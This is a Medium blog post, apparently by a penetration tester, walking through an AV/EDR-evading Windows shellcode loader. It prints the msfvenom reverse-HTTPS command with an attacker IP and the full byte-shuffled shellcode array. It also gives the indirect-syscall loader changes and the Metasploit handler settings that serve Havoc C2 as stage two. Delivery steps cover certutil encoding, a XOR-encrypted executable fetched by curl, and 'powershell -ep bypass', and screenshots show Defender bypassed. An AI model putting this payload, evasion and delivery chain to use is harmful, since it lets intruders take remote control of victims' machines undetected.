# https://medium.com/@sam.rothlisberger/manual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Manual Indirect Syscalls and Obfuscation for Shellcode Execution

## DISCLAIMER: Using these tools and methods against hosts that you do not have explicit permission to test is illegal. You are responsible for any damage you may cause by using these tools and methods.

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:32:32/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---byline--bb589148e56f---------------------------------------)

[Sam Rothlisberger](https://medium.com/@sam.rothlisberger?source=post_page---byline--bb589148e56f---------------------------------------)

Follow

15 min read

·

Mar 30, 2024

87

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dbb589148e56f&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&source=---header_actions--bb589148e56f---------------------post_audio_button------------------)

Share

For this post, we’re going to cover a possible way to bypass signature analysis from AV using **obfuscation** and NT API inspection from EDR using **indirect syscalls** with a shellcode loader PE. This will get past some AV and EDR that **only** does on-disk inspection of the PE (signature based) and inspects the system call return address (not the full stack), respectively.

## Generating Shellcode with Msfvenom

The Havoc C2 shellcode is pretty big, so we should use our msfvenom shellcode (stage 1 payload) to fetch the Havoc C2 shellcode as a stage 2 payload. I’m calling this shellcode msf.bin.

```
msfvenom -p windows/x64/custom/reverse_https LHOST=192.168.0.64 LPORT=8443 EXITFUNC=thread -f raw HttpUserAgent=’Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36' LURI=blog.html HandlerSSLCert=/home/atler/Downloads/www.google.com.pem -o msf.bin
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*JF6WgSyLzZAMn3eh7ArQBg.png)

Check out my previous post about making a HandlerSSLCert if you’re unsure.

## Generating Shellcode with Havoc C2

Check out my previous post about setting up the listener and generating the shellcode payload. We will use almost all the same options for the payload except we won't be using indirect syscalls because we’ll use our loader PE for that instead. I’m calling this shellcode Havoc.bin.

[**Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 1)** \\
\\
medium.com](https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b?source=post_page-----bb589148e56f---------------------------------------)

![](https://miro.medium.com/v2/resize:fit:549/1*ppIYR9VEuxfZ2dntO11f3A.png)

![](https://miro.medium.com/v2/resize:fit:554/1*N4V6tHuUEIAJ_sQSEWHGMA.png)

## Obfuscating Msfvenom Shellcode

Jigsaw takes a raw shellcode input and outputs randomized shellcode, a lookup table, and a C/C++ stub to translate the randomized shellcode back to a usable format. The reason to do this is so the entropy level (which could trigger EDR/AV) is not significantly increased like it would be with encryption and also the payload isn't significantly large as it would be if words were substituted for the shellcode instead.

[**GitHub - RedSiege/Jigsaw: Hide shellcode by shuffling bytes into a random array and reconstruct at…** \\
\\
**Hide shellcode by shuffling bytes into a random array and reconstruct at runtime - RedSiege/Jigsaw**\\
\\
github.com](https://github.com/RedSiege/Jigsaw?source=post_page-----bb589148e56f---------------------------------------)

The creator even states “At some point, the deobfuscated shellcode will exist in memory and could be detected there. The methods used to load and execute the shellcode would also present opportunities for detection. ” EDR solutions often have a better chance than AV due to their focus on behavioral analysis and memory monitoring. Download the python script and execute it with our generated msfvenom shellcode to get jiggsaw.txt.

```
python3 jigsaw.py msf.bin
```

Then we see the output in the jiggsaw.txt file which reconstructs the shellcode and we will put in our loader project on Visual Studio later:

```
unsigned char jigsaw[826] = { 0x36, 0x56, 0x58, 0x83, 0x18, 0x37, 0x89, 0x96, 0x00, 0x6a, 0x07, 0x77, 0x5a, 0xe8, 0x02, 0x0b, 0x32, 0x5e, 0x50, 0xc1, 0x48, 0xba, 0xba, 0x54, 0x41, 0x89, 0x65, 0xc1, 0xc7, 0x6b, 0x48, 0xd0, 0x48, 0xff, 0x53, 0x6a, 0x48, 0x00, 0x00, 0xc0, 0x46, 0x75, 0x2e, 0x6c, 0x38, 0x48, 0x47, 0x85, 0x01, 0x83, 0x53, 0x58, 0x48, 0xff, 0x6a, 0x4c, 0x68, 0x66, 0x4d, 0x79, 0x9e, 0xe0, 0x8b, 0x71, 0xc7, 0x00, 0x44, 0x39, 0x44, 0x59, 0xd2, 0x40, 0x67, 0x33, 0xc4, 0x58, 0x00, 0x67, 0x53, 0x5a, 0x51, 0x58, 0x57, 0x44, 0x73, 0x02, 0x8b, 0x34, 0x74, 0x3b, 0x57, 0x56, 0x50, 0x00, 0x47, 0x00, 0x71, 0xff, 0x00, 0x6c, 0x5a, 0x4d, 0xff, 0x53, 0x8b, 0x00, 0x59, 0x74, 0x5a, 0x52, 0x4b, 0xc1, 0x71, 0x75, 0x7a, 0x85, 0x57, 0x00, 0xc1, 0xc0, 0xff, 0x66, 0x48, 0x7a, 0x00, 0x4b, 0x62, 0x0f, 0x00, 0xff, 0x58, 0x30, 0x41, 0x6e, 0x00, 0x57, 0x12, 0x67, 0x41, 0x49, 0xbe, 0x6a, 0x03, 0xc9, 0x56, 0x90, 0x04, 0xd5, 0x74, 0x4d, 0x48, 0x31, 0x48, 0x4b, 0x10, 0x37, 0x4c, 0xe0, 0x4d, 0x61, 0x12, 0x84, 0x6c, 0x48, 0x53, 0x3c, 0xe1, 0x43, 0x57, 0x77, 0x85, 0x8b, 0x52, 0xfc, 0xc0, 0x33, 0xd5, 0x34, 0x6b, 0x00, 0xff, 0x96, 0x31, 0x89, 0x76, 0xff, 0x32, 0x89, 0xd5, 0x41, 0x1f, 0x72, 0x24, 0x0f, 0x59, 0xf1, 0x77, 0x6b, 0x69, 0x53, 0x48, 0x75, 0x48, 0x24, 0x44, 0x00, 0xe2, 0x78, 0xc6, 0x46, 0x02, 0x58, 0x50, 0x53, 0xa7, 0x49, 0x74, 0x50, 0x49, 0x00, 0xc2, 0x8b, 0x8b, 0x4c, 0x4d, 0x6b, 0x46, 0x2d, 0x72, 0x65, 0x52, 0x66, 0x20, 0x52, 0x00, 0x50, 0x88, 0x8b, 0x31, 0x41, 0x56, 0xf9, 0xd5, 0x52, 0xe1, 0xe2, 0xd8, 0x37, 0xd5, 0xed, 0x45, 0x48, 0x26, 0xd5, 0x7a, 0x41, 0x2d, 0x00, 0xff, 0x73, 0x00, 0x78, 0x00, 0x49, 0x00, 0xe4, 0x32, 0x72, 0x04, 0x7a, 0x76, 0x79, 0x49, 0x00, 0x89, 0x69, 0x00, 0x6a, 0x49, 0x75, 0x47, 0xc7, 0xdb, 0x89, 0x00, 0x42, 0x53, 0x53, 0x52, 0x5a, 0x52, 0x31, 0x39, 0x5a, 0xa4, 0x44, 0x80, 0xd5, 0x71, 0xf9, 0x20, 0x48, 0x6a, 0xd5, 0x65, 0x41, 0x33, 0xda, 0x4d, 0x89, 0xc0, 0x9f, 0xff, 0x55, 0x31, 0x6e, 0x00, 0x4a, 0x77, 0x53, 0x5a, 0x34, 0x42, 0x06, 0xc2, 0x68, 0x36, 0xd0, 0x59, 0x48, 0x31, 0x2d, 0x6c, 0x34, 0xe0, 0x4d, 0x5a, 0xe2, 0x35, 0x01, 0x46, 0x48, 0x4a, 0x13, 0x41, 0x76, 0x65, 0x31, 0x38, 0x34, 0x52, 0x53, 0x71, 0x48, 0x89, 0x00, 0xba, 0xff, 0x55, 0xc7, 0xd3, 0x31, 0x49, 0x2e, 0x80, 0x64, 0x31, 0x88, 0xff, 0x69, 0x00, 0x01, 0xd5, 0x6c, 0x36, 0x35, 0x75, 0xdc, 0x53, 0x48, 0xcf, 0x62, 0x8b, 0x45, 0xaa, 0x41, 0x53, 0x44, 0x6a, 0xc9, 0xeb, 0x39, 0x30, 0x20, 0xf1, 0x4f, 0x00, 0x89, 0x00, 0x40, 0x85, 0x00, 0x71, 0x68, 0x4d, 0xc9, 0x72, 0xc0, 0x41, 0x00, 0x01, 0x0a, 0x42, 0xc1, 0x4b, 0x0d, 0x52, 0xff, 0x00, 0xe3, 0x89, 0xff, 0x34, 0x48, 0x65, 0x31, 0x68, 0x6d, 0x66, 0x78, 0xff, 0x0d, 0x34, 0x53, 0x48, 0x52, 0x18, 0x34, 0x36, 0x65, 0x00, 0x62, 0x49, 0xb7, 0x00, 0xc9, 0x4d, 0xf1, 0xd0, 0x49, 0x50, 0x50, 0x4f, 0x41, 0x78, 0x08, 0xeb, 0x28, 0xc9, 0x59, 0xd5, 0x51, 0x53, 0x56, 0x89, 0xd1, 0x01, 0x41, 0xe8, 0x41, 0x39, 0x2e, 0x31, 0x00, 0xe2, 0x30, 0x8b, 0x64, 0x40, 0x01, 0x00, 0xe0, 0x38, 0x66, 0x48, 0x85, 0x46, 0x2a, 0x8b, 0x49, 0xc9, 0x50, 0x58, 0x2f, 0x8b, 0x0c, 0x48, 0x0d, 0x89, 0x44, 0x44, 0xc7, 0x00, 0x77, 0x48, 0x00, 0x45, 0xe8, 0x74, 0x57, 0xc3, 0x04, 0xff, 0x01, 0x37, 0x20, 0x48, 0x53, 0x58, 0x30, 0xe9, 0x42, 0x00, 0xff, 0x51, 0xff, 0x54, 0xe7, 0x6a, 0x53, 0x34, 0x6a, 0x8b, 0x41, 0x56, 0xba, 0x72, 0x47, 0x42, 0xfb, 0xa8, 0xc2, 0x71, 0x66, 0x59, 0x00, 0x49, 0x5a, 0x89, 0x48, 0xc6, 0x52, 0xc0, 0x48, 0x47, 0x4b, 0xc9, 0x48, 0x50, 0x77, 0x48, 0x4d, 0x2d, 0x54, 0x31, 0xd0, 0xf1, 0x39, 0x51, 0x32, 0x1f, 0xe1, 0x88, 0x00, 0x36, 0x6b, 0x67, 0x48, 0x00, 0x6a, 0x68, 0x00, 0x48, 0x75, 0x41, 0x71, 0x01, 0xda, 0x00, 0x81, 0x2e, 0x31, 0x55, 0x46, 0x77, 0x53, 0x49, 0x35, 0xc9, 0x83, 0x46, 0x56, 0x31, 0x58, 0x53, 0x59, 0x58, 0x73, 0x49, 0x00, 0x73, 0x4a, 0x41, 0x55, 0x47, 0x20, 0x62, 0x69, 0x50, 0x41, 0x58, 0x44, 0xd5, 0x8b, 0x00, 0x3c, 0xba, 0x43, 0xe8, 0x31, 0x41, 0x4d, 0xc0, 0x00, 0x49, 0xac, 0x41, 0x74, 0x72, 0x58, 0x31, 0x48, 0x8b, 0x4a, 0x41, 0xc0, 0x89, 0x67, 0x6c, 0x89, 0x41, 0xc0, 0x36, 0x00, 0xcc, 0x64, 0x18, 0x51, 0x70, 0x48, 0x12, 0x52, 0x00, 0x53, 0xf1, 0x53, 0x00, 0xd0, 0x61, 0x00, 0xc1, 0x83, 0x5f, 0x64, 0x33, 0x0a, 0x57, 0xb8, 0x53, 0x53, 0x54, 0x72, 0x48, 0x38, 0x53, 0x65, 0xc9, 0xe0, 0x53, 0x00, 0x6a, 0x71, 0x18, 0x00, 0xf0, 0x89, 0x1c, 0x48, 0x89, 0x2f, 0x60, 0x00, 0x54, 0x48, 0x84, 0x49, 0xe5, 0x76, 0x2e, 0x49, 0x41, 0x00, 0xff, 0x48, 0x89, 0x5a, 0x78, 0x38, 0x36, 0x57, 0x50, 0x32, 0xba, 0x01, 0x57, 0x48, 0x6a, 0x6f, 0x45, 0x6d, 0x6d, 0x7c, 0x00, 0x4c, 0x4a, 0x59, 0x7b, 0xd0, 0x37, 0x89, 0x51, 0x50, 0x72, 0x40, 0xec, 0x6b, 0xd6, 0x00, 0x88, 0x49, 0x00, 0x77, 0x77, 0x00, 0x36, 0x48, 0x77, 0x75, 0x4d, 0x93, 0x3a, 0x75, 0xc1, 0x45, 0xff, 0x86, 0x68, 0x5a, 0x78, 0x75, 0x67, 0x48, 0x49, 0x73, 0x52, 0x0f, 0xbb, 0x89, 0x48, 0x33, 0x4a, 0x44, 0x20, 0x89, 0x73, 0xf0, 0x00, 0x55, 0x41, 0x53, 0x20, 0x00, 0x79, 0x6d, 0x54, 0x5a, 0xc7, 0xac, 0x74, 0x4a, 0x49, 0x5f, 0xc0, 0x46, 0x5d, 0x5a, 0x49, 0x00, 0x49, 0x2c, 0x8b, 0xc0, 0x41, 0x74, 0xba, 0x51, 0x31, 0x1d, 0x03, 0xc4, 0x00, 0x2d, 0xc9, 0x00, 0x58, 0x33 };

int positions[826] = { 461, 19, 179, 2, 664, 427, 290, 721, 814, 627, 240, 493, 193, 319, 695, 81, 421, 185, 13, 61, 771, 787, 719, 399, 480, 310, 473, 674, 293, 477, 231, 182, 648, 117, 505, 615, 74, 725, 795, 779, 382, 487, 602, 326, 438, 672, 378, 84, 127, 799, 770, 530, 126, 604, 813, 146, 523, 407, 643, 546, 635, 141, 34, 346, 673, 686, 350, 276, 104, 747, 17, 106, 99, 521, 800, 810, 94, 409, 541, 288, 486, 579, 348, 548, 555, 82, 164, 506, 227, 603, 309, 230, 36, 593, 484, 764, 367, 641, 88, 403, 249, 253, 809, 257, 89, 273, 815, 732, 462, 465, 516, 139, 420, 142, 571, 730, 433, 793, 134, 252, 666, 428, 180, 551, 685, 210, 325, 83, 753, 796, 757, 471, 229, 225, 314, 566, 788, 328, 59, 718, 220, 304, 305, 255, 261, 806, 176, 690, 559, 37, 109, 655, 289, 406, 752, 472, 144, 626, 414, 455, 720, 805, 466, 206, 769, 73, 233, 481, 534, 413, 802, 30, 67, 0, 47, 621, 825, 499, 468, 297, 728, 789, 275, 649, 349, 317, 418, 246, 729, 188, 671, 445, 147, 804, 186, 143, 347, 456, 222, 218, 194, 633, 741, 158, 388, 86, 791, 423, 608, 634, 52, 436, 542, 306, 263, 171, 98, 437, 708, 688, 661, 175, 168, 457, 654, 432, 476, 405, 362, 549, 345, 162, 54, 27, 272, 103, 91, 123, 652, 122, 389, 320, 318, 199, 710, 62, 153, 570, 797, 63, 547, 606, 239, 605, 344, 198, 434, 92, 692, 440, 266, 539, 321, 755, 640, 3, 587, 35, 628, 371, 525, 262, 777, 592, 716, 338, 678, 469, 624, 513, 560, 235, 217, 784, 586, 72, 411, 657, 31, 496, 14, 644, 454, 577, 758, 167, 90, 667, 478, 785, 32, 774, 711, 642, 353, 55, 398, 782, 385, 625, 645, 311, 213, 444, 216, 223, 794, 43, 439, 303, 740, 286, 368, 663, 599, 442, 361, 76, 453, 715, 251, 565, 333, 124, 201, 299, 451, 706, 531, 138, 518, 573, 44, 676, 713, 507, 501, 120, 374, 535, 342, 738, 504, 40, 778, 677, 680, 808, 474, 749, 743, 581, 659, 278, 620, 379, 512, 675, 268, 224, 622, 60, 766, 393, 396, 683, 670, 733, 576, 25, 693, 359, 108, 426, 697, 12, 759, 681, 540, 582, 600, 150, 557, 107, 614, 500, 751, 790, 687, 157, 668, 298, 554, 341, 352, 118, 85, 750, 163, 754, 172, 610, 401, 56, 483, 58, 618, 211, 93, 114, 574, 212, 419, 704, 446, 380, 511, 567, 450, 561, 824, 271, 377, 243, 612, 449, 110, 495, 280, 226, 87, 364, 502, 42, 763, 653, 580, 717, 102, 159, 337, 528, 558, 190, 79, 148, 696, 737, 656, 739, 269, 448, 646, 115, 775, 151, 112, 174, 698, 629, 410, 284, 16, 274, 723, 544, 66, 532, 745, 101, 591, 684, 503, 77, 45, 96, 383, 819, 22, 631, 301, 394, 714, 324, 207, 165, 584, 136, 742, 458, 475, 598, 702, 238, 1, 322, 149, 270, 331, 366, 811, 712, 807, 181, 460, 801, 780, 583, 812, 283, 209, 569, 8, 765, 11, 241, 360, 773, 563, 372, 373, 609, 105, 183, 384, 632, 422, 543, 489, 295, 588, 236, 340, 376, 204, 265, 783, 617, 709, 29, 312, 392, 803, 65, 514, 424, 39, 21, 459, 550, 129, 250, 662, 524, 300, 113, 650, 336, 402, 556, 616, 247, 177, 228, 429, 537, 527, 15, 762, 744, 330, 637, 245, 400, 821, 517, 75, 823, 792, 78, 329, 46, 601, 526, 479, 244, 748, 355, 135, 195, 529, 533, 130, 154, 256, 630, 189, 491, 258, 726, 497, 568, 578, 416, 339, 197, 343, 564, 594, 10, 184, 351, 242, 156, 315, 49, 259, 417, 5, 279, 178, 119, 97, 572, 679, 132, 746, 488, 395, 202, 254, 215, 26, 435, 137, 669, 772, 375, 441, 822, 203, 294, 285, 7, 6, 415, 80, 18, 412, 95, 208, 64, 639, 707, 776, 596, 313, 161, 50, 590, 291, 735, 611, 447, 536, 820, 522, 585, 248, 658, 408, 470, 100, 281, 302, 20, 57, 817, 595, 727, 390, 467, 28, 316, 682, 607, 170, 116, 722, 334, 24, 287, 363, 33, 589, 292, 760, 509, 282, 234, 133, 700, 200, 734, 705, 187, 482, 140, 404, 485, 397, 277, 756, 160, 335, 691, 430, 327, 520, 332, 699, 51, 323, 237, 552, 191, 665, 173, 386, 613, 70, 452, 490, 169, 196, 562, 128, 264, 125, 111, 638, 356, 494, 724, 545, 798, 221, 498, 651, 768, 260, 152, 575, 381, 689, 636, 619, 647, 387, 365, 515, 767, 219, 508, 23, 41, 816, 232, 166, 443, 358, 155, 296, 781, 553, 4, 9, 538, 69, 703, 68, 701, 391, 369, 463, 205, 660, 48, 519, 370, 597, 425, 131, 492, 214, 354, 786, 623, 307, 53, 71, 731, 192, 694, 308, 464, 38, 818, 145, 736, 267, 357, 121, 761, 510, 431 };

int calc_len = 826;
unsigned char calc_payload[826] = { 0x00 };
int position;

// Reconstruct the payload
for (int idx = 0; idx < sizeof(positions) / sizeof(positions[0]); idx++) {
        position = positions[idx];
        calc_payload[position] = jigsaw[idx];
}
```

## Obfuscating through Indirect Syscalls

On the EDR side (which may be hooked into DLLs like ntdll.dll) we can use indirect syscalls to make it looks like, for example, a call originated from NT API NtAllocateVirtualMemory instead of our shellcode loader PE so we would look normal if the EDR’s kernel mode driver inspects the callstack as well. Using indirect system calls involves directly invoking system call entry points in the Windows Native API (NTAPI) by their system call numbers, rather than going through the Windows API functions that wrap these calls. Most EDRs write their hooks at the start of the Nt function, overwriting the SSN but leaving the syscall instruction intact. This allows us to utilize the syscall instructions already provided by ntdll instead of bringing our own. We can just set up the r10 and eax registers ourselves (below), then jump to the syscall instruction inside the hooked ntdll function (which comes after the EDR’s hook). As stated previously, the author said “The methods used to load and execute the shellcode would also present opportunities for detection”. however, indirect syscalls may be able to bypass detection from EDRs that are looking at the first return address for the syscall, which we can make to look like it came from ntdll.dll, not our malicious code as seen below.

![](https://miro.medium.com/v2/resize:fit:605/1*qolCWQAQoHpVt8q1E4CQiA.png)

We’re going to use this fairly new shellcode loader resource below from GitHub to put our obfuscated shellcode (jiggsaw.txt file) in ShellcodeLoader.c.

[**GitHub - 0xcf80/ShellCodeLoader\_Indirect\_Syscalls: Shellcode Loader using indirect syscalls** \\
\\
**Shellcode Loader using indirect syscalls. Contribute to 0xcf80/ShellCodeLoader\_Indirect\_Syscalls development by…**\\
\\
github.com](https://github.com/0xcf80/ShellCodeLoader_Indirect_Syscalls?source=post_page-----bb589148e56f---------------------------------------)

> You can skip to the next section unless you want to know what I changed, I’m going to include the revised code on my Github [here](https://github.com/srothlisberger6361/ShellCodeLoader_Indirect_Syscalls/tree/main) so you really just need to change **unsigned char shellcode\_int3**, **unsigned char jigsaw, int positions**, and **int calc\_len** within ShellcodeLoader.c if you want to try this yourself!

First, completely delete shellcode.h. We can put everything in the ShellcodeLoader.c. We need to swap the NtWaitForSingleObject API call function here:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*IYrfL1wFs4dzYEiqm95c2g.png)

For this code here:

```
// Wait for 1 second & execute
LARGE_INTEGER Timeout;
Timeout.QuadPart = -10000000;
while (TRUE) {
    // Prepare for and perform the syscall to wait on the thread
    PrepareSyscall(pSyscallTable->NtWaitForSingleObject.syscallId, pSyscallTable->NtWaitForSingleObject.pSyscall);
    status = DoIndirectSyscall(hHostThread, FALSE, &Timeout);

    if (status == STATUS_WAIT_0) {
        DEBUG_PRINT("Reverse shell thread has completed its execution.\n");
        break; // Exit the loop if the thread has signaled completion
    }
    else if (status == STATUS_TIMEOUT) {
        DEBUG_PRINT("Still executing the reverse shell thread...\n");
        // The thread is still running; the main program can continue to wait or perform other tasks
        // Optionally, this is a good place to check for other conditions to continue waiting or not
    }
    else {
        DEBUG_PRINT("NtWaitForSingleObject Failed with status: %x\n", status);
        break; // An error occurred; handle accordingly
    }
    // Adjust the timeout for your next wait period as necessary.
    // This loop will continue to keep the program alive, checking on the thread at each interval.
}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*zZzYEUVlTRNejZLflc4sWg.png)

I did this so that the main thread enters a loop where it periodically checks on the reverse shell thread using NtWaitForSingleObject through indirect syscalls. Ultimately, it would be waiting for a signal from the monitored hHostThread to terminate the thread and then the PE. For our case, this makes sure the PE loader doesn't exit after the thread executes because we wouldn't want to get a connection for only 1 second.

## Get Sam Rothlisberger’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

And also add in our jiggsaw msfvenom shellcode obfuscated stub that was generated for us. I change it alittle bit so that the _calc\_payload_ variable is now _shellcode\_int3_, just because that is what the argument to the function was in _execute\_shellcode\_create\_thread_ and referenced elsewhere.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*Kqsrrk6Sm1_R0kXT_iUp-w.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*oVUM3AVJGbMJgqRRnvtFIw.png)

## Delivering Havoc C2 stage 2 Shellcode (msfconsole)

Similar to my previous post, this stage 1 payload connection using msfvenom is going to download the stage 2 payload connection for Havoc C2 shellcode so we can get some more functionality than we would with just msfvenom. Here’s the options:

- use multi/handler
- set payload windows/x64/custom/reverse\_https
- set exitfunc thread
- set lhost <IP ADDR>
- set lport 8443
- set luri blog.html
- set HttpServerName Blogger
- set shellcode\_file Havoc.bin
- set exitonsession false
- set HttpHostHeader [www.factbook.com](http://www.factbook.com/)
- set HandlerSSLCert [www.google.com.pem](http://www.google.com.pem/)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*d3hmJQ5eEO34zSGxhlJ9HA.png)

## Detection

This is not anywhere close to a complete bypass for all products. What if the EDR checks more than just the first return address? Not just where the syscall came from, but who called the function that executed the syscall. In this case, if we’re doing indirect syscalls from some shellcode located in dynamically allocated memory, then the EDR is going to see that. Ideally, we want to fake more than just the system call return address. An interesting solution to this is call stack spoofing which I'll cover in another post.

Although I don’t do this usually (I’m sorry), I was interested so uploaded it to Virus Total. It was only identified by 10/72 vendors which isn't bad. Microsoft was able to identify it as malware, but not bitdefender or avast which is interesting.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*n0Mohk7K8DTkoC3CwEyrnQ.png)

One thing I noticed is Microsoft was detecting the **transfer** of the PE when I try to download it from the internet, but the execution itself was undetected. So, what we can do is some old fashioned encoding/decoding or encrypting of the PE to bypass this. Here’s two methods.

### Option 1- Certutil

1. **Attacker:** certutil -encode ShellcodeLoader.exe test.txt
2. **Victim:** curl [https://raw.githubusercontent.com/srothlisberger6361/revshell\_indirect/main/test.txt](https://raw.githubusercontent.com/srothlisberger6361/revshell_indirect/main/test.txt) -o test.txt
3. **Victim:** certutil -decode test.txt test.exe

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*DHIykDiPAM5NsTwGglViTA.png)

### Option 2- Manual XOR Encryption

1. Encrypt the PE

```
#encrypt.ps1
$byteArray = [IO.File]::ReadAllBytes(“$pwd\\ShellcodeLoader.exe”)
$KeyArray = @(90, 15, 69, 23, 21)
$keyposition = 0
for ($i = 0; $i -lt $byteArray.count; $i++)
{
    $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition];
    $keyposition += 1;
    if ($keyposition -eq $keyArray.Length) {
        $keyposition = 0 ;
        }
}
[IO.File]::WriteAllBytes(“$pwd\\ShellcodeLoader.exe.xored”, $byteArray)
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*X2ay29heHV8Ifm6fHsmGmg.png)

2\. Transfer the encrypted PE to the Victim

```
#Transfer XOR encrypted PE to victim disk
curl https://raw.githubusercontent.com/srothlisberger6361/revshell_indirect/main/ShellcodeLoader.exe.xored -o ShellcodeLoader.exe.xored
```

3\. Decrypt the PE on Victim

```
#decrypt.ps1
$byteArray = [IO.File]::ReadAllBytes("$pwd\\ShellcodeLoader.exe.xored");
$KeyArray = @(90, 15, 69, 23, 21);
$keyposition = 0;
for ($i = 0; $i -lt $byteArray.count; $i++)
{
    $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition];
    $keyposition += 1;
    if ($keyposition -eq $keyArray.Length) {
        $keyposition = 0 ;
          }
}
$outputFile = "$pwd\ShellcodeLoader.exe"
[IO.File]::WriteAllBytes($outputFile, $byteArray)
```

```
#fetch decrypt.ps1
curl https://raw.githubusercontent.com/srothlisberger6361/revshell_indirect/main/decrypt.ps1 -o decrypt.ps1
```

```
#run decryption and output exe to disk
powershell -ep bypass -File “decrypt.ps1”
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ah0mUxRF2Y_3n8ot5lko_Q.png)

## Testing on Windows Defender

Time to test this out on easy mode.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*a3rnRy5KKjyFsmzJ-EGa5g.png)

Real-Time Protection Enabled

1. Start the stage 1 handler

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Mvhim1yVWy01etWqrhQgwQ.png)

Stage 1 Listener

2\. Start Havoc C2

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*_mYEyuk-lPhe2oUGRva0xw.png)

Stage 2 Listener

3\. Deliver and Execute the payload as described above

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*DNJpzMlZrBtf8kiTj7d6cw.png)

Execute Payload

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*amXveBebYTr5sswe8E2rzQ.png)

Stage 2 Payload (Havoc C2) Payload Delivered

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*v516To3hdZSSCHSfqoBmBw.png)

“whoami” Command Executed on Havoc C2 Listener

Obviously this isnt a perfect exploit, but it taught me some things about indirect syscalls and the power of obfuscation/basic encyption against AV. Don’t rely on this exact PE working in the future especially since I uploaded it to Virus Total, you’ll have to modify it or make your own (possibly a .NET assembly so that you can do reflective assembly loading in PowerShell memory after an AMSI bypass). I hope you enjoyed this post!

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----bb589148e56f---------------------------------------)

[Networking](https://medium.com/tag/networking?source=post_page-----bb589148e56f---------------------------------------)

[Defender For Endpoint](https://medium.com/tag/defender-for-endpoint?source=post_page-----bb589148e56f---------------------------------------)

[Pentesting](https://medium.com/tag/pentesting?source=post_page-----bb589148e56f---------------------------------------)

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:48:48/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--bb589148e56f---------------------------------------)

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:64:64/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--bb589148e56f---------------------------------------)

Follow

[**Written by Sam Rothlisberger**](https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--bb589148e56f---------------------------------------)

[1K followers](https://medium.com/@sam.rothlisberger/followers?source=post_page---post_author_info--bb589148e56f---------------------------------------)

· [5 following](https://medium.com/@sam.rothlisberger/following?source=post_page---post_author_info--bb589148e56f---------------------------------------)

CompTIA Security+ Practice Questions : [https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE](https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE)

Follow

## Responses (1)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fmanual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f&source=---post_responses--bb589148e56f---------------------respond_sidebar------------------)

Cancel

Respond

